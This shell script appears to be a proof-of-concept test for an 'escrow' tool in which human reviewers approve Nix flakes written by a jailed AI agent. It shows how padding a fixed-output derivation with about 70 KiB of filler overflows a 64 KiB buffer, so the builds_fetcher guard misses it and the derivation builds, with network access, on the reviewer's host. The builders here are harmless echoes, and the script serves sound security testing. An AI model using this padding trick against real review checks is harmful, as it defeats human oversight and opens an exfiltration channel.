#!/bin/sh
# PoC: defeat closure.c's fixed-output-derivation (FOD) guard so an
# agent-written FOD gets BUILT during `escrow review --closures` / sign.
# A FOD is the one derivation kind Nix grants network to inside its sandbox,
# so building one the agent wrote is an exfiltration/SSRF channel from the
# reviewer's host. Review-time FOD exfil was a known BLOCKER; the fix was
# builds_fetcher() refusing "any fixed-output derivation that would be built".
#
# Bug: builds_fetcher (src/closure.c) reads `nix derivation show <drv>` into a
# fixed 64 KiB buffer (OUT_MAX) and greps it for outputHash/hashAlgo/hash. Pad
# the FOD with a ~70 KiB env attribute and the hash markers land past 64 KiB;
# the grep sees none, builds_fetcher returns "not a fetcher", build() builds
# the FOD, and its builder runs on the review host.
#
# The builders here are harmless/offline (echo). A real FOD builder is
# builtin:fetchurl / curl with a secret in the URL. We contrast:
#   unpadded FOD -> review prints "refused: it would build fixed-output ..."
#   padded   FOD -> NOT refused; the FOD's store path appears (builder ran).
#
# usage: tests/escape/poc/closure-fod-pad-bypass.sh /abs/escrow /abs/policy
set -eu
escrow=${1:?usage: $0 /abs/escrow /abs/policy}
policy=${2:?usage: $0 /abs/escrow /abs/policy}
[ "$(id -u)" -ne 0 ] || { echo "run as non-root"; exit 0; }
[ "$(nix config show sandbox 2>/dev/null)" = true ] || { echo "needs sandbox=true"; exit 0; }
fodhash="sha256-c8s4WKaHqElMozIwUwFigvPa051Cz2LKTnndoqrH2aw=" # sha256 of "x\n", flat

tmp=$(mktemp -d)
trap 'chmod -R u+rwx "$tmp" 2>/dev/null; rm -rf "$tmp"' EXIT
cd "$tmp"
export ESCROW_STATE=$tmp/state ESCROW_ROLES=$tmp/roles
pub() { cut -d' ' -f1,2 "$1.pub"; }
for u in alice bob carol; do ssh-keygen -q -t ed25519 -N '' -C "$u" -f "$u"; done
{ echo "alice requester $(pub alice)"
  echo "bob reviewer $(pub bob)"
  echo "carol signer $(pub carol)"; } > roles

# A local path input only so the base flake has a flake.lock (closure.c skips
# a flake with no lock). No network.
mkdir dummyflake
echo '{ outputs = { self }: { x = 1; }; }' > dummyflake/flake.nix
mkdir ws
cat > ws/flake.nix <<EOF
{
  inputs.dummy.url = "path:$tmp/dummyflake";
  outputs = { self, dummy }: {
    nixosConfigurations.poc.config.system.build.toplevel =
      derivation { name = "benign-top"; system = "x86_64-linux";
        builder = "/bin/sh"; args = [ "-c" "echo benign > \$out" ]; };
  };
}
EOF
( cd ws && nix flake lock >/dev/null 2>&1 )

# $1 = pad repeat count (7000 -> ~70 KiB -> bypass; 1 -> no pad -> refused)
# $2 = unique FOD name. The agent (in the jail) rewrites flake.nix so the
# proposed toplevel depends on this FOD. Unquoted heredoc: shell fills in
# $tmp/$1/$2/$fodhash; \${fod} and \$out stay literal for Nix.
run_case() {
  "$escrow" --role "$policy" --workspace ws --key alice --state state -- \
    /bin/sh -c "cat > flake.nix <<NIXEOF
{
  inputs.dummy.url = \"path:$tmp/dummyflake\";
  outputs = { self, dummy }: {
    nixosConfigurations.poc.config.system.build.toplevel =
      let fod = derivation {
        name = \"$2\";
        system = \"x86_64-linux\";
        builder = \"/bin/sh\";
        args = [ \"-c\" \"echo x > \\\$out\" ];
        outputHashMode = \"flat\";
        outputHashAlgo = \"sha256\";
        outputHash = \"$fodhash\";
        AAAA_pad = builtins.concatStringsSep \"\" (builtins.genList (i: \"AAAAAAAAAA\") $1);
      };
      in derivation {
        name = \"evil-top\";
        system = \"x86_64-linux\";
        builder = \"/bin/sh\";
        args = [ \"-c\" \"echo \\\${fod} > \\\$out\" ];
      };
  };
}
NIXEOF" >/dev/null 2>>"$tmp/agent.err"
  "$escrow" list | tail -n1 | cut -d' ' -f1
}

echo "=============== CONTROL: unpadded FOD (guard must fire) ==============="
id=$(run_case 1 "escrow-fod-ctl-$(date +%s)-$$")
"$escrow" review "$id" --closures > ctl.out 2>&1 || true
if grep -q "refused: it would build fixed-output derivation" ctl.out; then
  echo "ok: unpadded FOD refused by builds_fetcher"
else
  echo "control did NOT refuse (unexpected); tail:"; grep -iE "closure|refus|built" ctl.out | tail
fi

echo "=============== ATTACK: padded FOD (guard bypassed) ==================="
evil="escrow-fod-exfil-$(date +%s)-$$"
ls -d /nix/store/*"$evil" >/dev/null 2>&1 && { echo "stale artifact"; exit 1; }
id=$(run_case 7000 "$evil")
"$escrow" review "$id" --closures > evil.out 2>&1 || true
refused=no; grep -q "refused: it would build fixed-output derivation" evil.out && refused=yes
built=no; ls -d /nix/store/*"$evil" >/dev/null 2>&1 && built=yes
echo "  builds_fetcher refused it? $refused"
echo "  FOD builder executed during review (store path present)? $built"
if [ "$refused" = no ] && [ "$built" = yes ]; then
  echo
  echo "POPPED: a padded fixed-output derivation slipped past builds_fetcher"
  echo "        and its builder RAN during 'escrow review --closures':"
  ls -d /nix/store/*"$evil"
  echo "        A real FOD builder here has network = exfil from the review host."
  exit 0
fi
echo "not reproduced; review tail:"; tail -12 evil.out
exit 1
